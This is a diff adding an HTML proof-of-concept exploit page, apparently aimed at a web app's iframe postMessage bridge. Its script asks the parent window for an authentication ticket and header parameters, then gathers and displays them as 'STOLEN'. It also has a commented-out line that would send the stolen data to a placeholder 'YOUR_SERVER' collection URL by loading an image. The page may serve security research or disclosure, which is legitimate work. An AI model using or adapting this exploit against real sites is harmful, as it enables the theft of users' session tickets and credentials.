@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<h3 id="status">Waiting for bridge response...</h3>
+<pre id="output"></pre>
+<script>
+var stolen = {};
+var output = document.getElementById('output');
+var status = document.getElementById('status');
+
+function log(msg) {
+    output.textContent += msg + '\n';
+}
+
+window.addEventListener('message', function(e) {
+    var data = e.data;
+    if (!data || data.from !== 'parent') return;
+
+    log('[RECV] method=' + data.method + ' data=' + JSON.stringify(data.data));
+
+    if (data.method === 'getTicket' && data.data) {
+        stolen.ticket = data.data;
+        status.textContent = 'Got ticket!';
+    }
+    if (data.method === 'getHeaderParams' && data.data) {
+        stolen.headers = data.data;
+    }
+
+    if (stolen.ticket && stolen.headers) {
+        status.textContent = 'ALL STOLEN!';
+        log('\n=== STOLEN TICKET ===');
+        log('ticket: ' + stolen.ticket.ticket);
+        log('\n=== STOLEN HEADERS ===');
+        var h = stolen.headers.headers || stolen.headers;
+        for (var k in h) {
+            log(k + ': ' + h[k]);
+        }
+
+        // Exfil to attacker server (replace with your server)
+        // new Image().src = "https://YOUR_SERVER/collect?data=" + encodeURIComponent(JSON.stringify(stolen));
+    }
+});
+
+// Steal ticket
+window.parent.postMessage({
+    from: 'child',
+    id: 'steal_' + Math.random().toString(36).slice(2),
+    method: 'getTicket',
+    data: {}
+}, '*');
+
+// Steal headers
+window.parent.postMessage({
+    from: 'child',
+    id: 'steal_' + Math.random().toString(36).slice(2),
+    method: 'getHeaderParams',
+    data: {}
+}, '*');
+
+log('[SENT] getTicket request');
+log('[SENT] getHeaderParams request');
+</script>
+</body>
+</html>
